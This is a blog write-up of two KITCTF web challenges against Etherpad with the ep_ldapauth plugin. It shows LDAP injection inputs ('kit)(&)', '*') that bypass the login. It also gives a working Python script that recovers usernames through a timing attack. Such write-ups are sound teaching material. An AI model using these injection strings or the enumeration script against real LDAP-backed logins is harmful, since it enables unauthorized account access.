---
layout: post
current: post
cover: assets/kitctf/etherpad/cover.webp
navigation: True
title: "Etherpad 1 & 2"
date: 2023-01-02 10:00:00
tags: [KITCTFCTF, web]
class: post-template
subclass: 'post'
author: kyleburgess2025
---

LDAP me up, bro.

## Etherpad Part 1
We are given a link to an Etherpad instance and the password for an account. However, we are told that the username is unknown.

We are also told that the server is running Etherpad 1.8.18 with [ep_ldapauth 0.4.0](https://github.com/tykeal/ep_ldapauth/tree/42cd54c8f65ebb4b4c061b682be2acaf5486e0bc). Finally, we are given a JSON file titled "settings." This contained the LDAP auth settings. I looked into them, but didn't find anything worthwhile - pretty standard stuff.

### LDAP?

Let's talk about LDAP authentication. LDAP, or Lightweight Directory Access Protocol, is a "mature, flexible, and well supported standards-based mechanism for interacting with directory servers," according to [ldap.com](https://ldap.com). Generally, it is used to store hierarchical data about users, groups, and applications. Directory servers, notably, store trees of entries and are therefore NoSQL databases. Each LDAP entry has three primary components: a name (uniquely identifies entry and its position on the directory information tree hierarchy - similar to a file path), a collection of attributes, and a collection of object classes.

This is cool and all, but can we exploit it in some way?

### Putting the L in LDAP, amiright? Please laugh.

That's right baby, LDAP injection exists. And it's pretty straightforward, too - check out [this article](https://brightsec.com/blog/ldap-injection/) on LDAP injection in its many forms. It works just the same as SQL injection, but takes into account the LDAP protocol structure. For example, the statement ```(&(USER=Uname)(PASSWORD=Pwd))``` is often used in authentication. The ```&``` symbol checks to make sure both of the following statements are true; ie, both ```USER=Uname``` and ```PASSWORD=Pwd```. So, let's just say we need to log into the account with the username `kit`, but we do not know the password. We can input ```kit)(&)```, and the full query will become ```(&(USER=kit)(&))(PASSWORD=Pwd))```. This will only compare ```USER=kit``` and ```&```, which is the ```TRUE``` filter in the LDAP protocol. Therefore, the result will be true and the user will gain access without the password.

### The Solve
That's great and all, but in our case, we have the password, but we do not have the username. So, I started playing around with what I learned. An important filter in LDAP is ```*```. Similarly to SQL, it is the "all" filter. So, I tried inputting * as the username. Lo and behold, it worked! The flag was at the bottom of the page: 

```KCTF{nobody_escapes_ldap_filters}```

That got 16 solves. Come on, people.

## Etherpad Part 2

Alright, this is where it gets interesting. For this one, we know that the username is identical to the password for every account. Unfortunately, we do not know either. We do know that the username/password begins with "kctf{" and, using our amazing deductive skills, probably ends with "}". We also know that the flag format is ```kctf\{[a-z0-9{}_.]*\}```. 

### My Attempt
I should clarify - I did not figure this one out. I tried for ages to find the correct LDAP injection to crack this puzzle. I tried ```kctf\{*\}``` for the username, as it would get every entry of form "kctf{...}". I tried ```{{username}}``` for the password. I tried some tricky stuff with ANDs and ORs that were based on the attacks mentioned in the article above. Nothing seemed to work. But did I give up? Yes. After a few hours of scouring the internet, reading the ```settings.json``` file, and searching for version-specific exploits, I opted to take a nap rather than torment myself further. I am nothing if not a quitter.

### The Solution
The great news is I was not even close. The solution was not in LDAP injection at all - in fact, it was a TIMING ATTACK! So cool! Such a fan of that. Wow. You will notice that if you input a random word into the username field of the authentication, it takes around 1.8 seconds for a response. However, if you type in something that finds users, for example ```kctf\{*```, it will take upwards of 2.3 seconds for a response to be returned. We can use this to create a bruteforce attack:
* Cycle through all of the possible characters
* For each character char, test signing in with ```previous_username + char + *```
* If the response takes longer than 2.3 seconds, append this character to previous_username and try again
* Keep going until the character "}" is appended
It is important to note that we can automate this by testing usernames with the URL ```http://USERNAME:x@etherpad2.kitctf.me:9002/```. This will attempt to sign in with username ```USERNAME``` and will have the correct timing properties.

Here is the code for the correct solution, written by @eta#0667 on Discord.
```py
#!/usr/bin/env python3
import requests, time

# Possible characters in the username
character_list = ['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', '\.', '_', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', '\{', '\}']

# If the user exists, request will take longer than this many seconds
threshhold=2.3

flag = "kctf\{"
while True:
    for x in character_list:
        flag_try = flag+x
        response = requests.get("http://"+flag_try+"*:x@etherpad2.kitctf.me:9002/")
        elapsed = response.elapsed.total_seconds()
        print(f"{flag_try}:{response.status_code}:{elapsed}")
        if elapsed > threshhold:
            print(f"Found {flag_try}")
            flag = flag_try
            break
```
After a decent chunk of time this thing gave me the solution: kctf{user_enumer4t1on_zer0day}.

## Conclusion
I found these two challenges to be incredibly interesting simply because I had no prior experience with LDAP authentication. The first one was fun because I got to do a deep dive in LDAP injection, and then find out the solution required maybe 2 minutes of research. The second had a really cool solution, although I'm not sure I would have ever guessed a timing attack. Plus, I have the worst WiFi known to man so getting the timing attack to run correctly for, like, thirty minutes was a struggle. That's on me though. I had fun with these challenges and learned a lot!